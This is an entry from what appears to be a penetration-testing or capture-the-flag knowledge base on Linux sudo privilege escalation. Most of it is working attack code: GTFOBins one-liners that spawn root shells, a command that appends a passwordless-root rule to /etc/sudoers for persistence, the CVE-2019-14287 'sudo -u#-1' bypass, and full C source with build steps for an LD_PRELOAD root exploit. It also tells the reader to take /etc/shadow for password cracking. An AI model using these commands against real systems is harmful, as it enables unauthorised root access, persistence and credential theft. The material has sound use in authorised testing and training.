---
id: linux-sudo
title: Linux Sudo Abuse
stage: privesc
tags: [linux]
summary: Check what you can run with sudo and abuse it for a root shell — GTFOBins covers 90% of cases, and misconfigurations like LD_PRELOAD or sudo < 1.8.28 cover the rest.
leads_to:
  - root-linux
---

## Prerequisites

A shell as a non-root user. `sudo -l` available (almost always is). Any binary in the sudo output that appears on GTFOBins is likely exploitable.

`sudo -l` is the first command to run on any Linux foothold — always. Even locked-down sudo configs (e.g., `NOPASSWD: /usr/bin/find`) frequently have GTFOBins entries. The LD_PRELOAD vector is a misconfiguration where the sysadmin preserved that environment variable, allowing library injection with any allowed sudo binary.

## Quick Win

> Run `sudo -l` first, cross-reference every binary against GTFOBins — most privesc paths start here.

```bash
sudo -l
# Then visit: https://gtfobins.github.io/ for each allowed binary
```

## GTFOBins Quick Reference

> Common binaries with sudo — each spawns a root shell directly.

```bash
# vim
sudo vim -c '!bash'

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# find
sudo find . -exec /bin/bash \; -quit

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# nmap (old versions with --interactive)
sudo nmap --interactive
# nmap> !sh

# env
sudo env /bin/bash

# less / more (type this at the pager prompt)
sudo less /etc/hosts
# !/bin/bash

# tee (write to /etc/sudoers for permanent root)
echo "user ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

## CVE-2019-14287 (sudo < 1.8.28)

> User ID `-1` is interpreted as UID 0 — bypasses user-specific sudo restrictions.

```bash
sudo -V
# If version < 1.8.28 AND sudo -l shows (ALL) on any binary:
sudo -u#-1 /bin/bash
```

## LD_PRELOAD Exploit

> If `env_keep+=LD_PRELOAD` appears in sudo output, inject a shared library to escalate.

```bash
# Check sudo -l for: Defaults env_keep+=LD_PRELOAD

cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
sudo LD_PRELOAD=/tmp/exploit.so /usr/bin/find
```

## Leads To

Root shell from GTFOBins binary → root-linux (grab proof and `/etc/shadow`). LD_PRELOAD or sudo CVE → same. Any sudo path with no GTFOBins entry → check for writable config files the binary uses as root, or use it to read `/etc/shadow` for cracking.
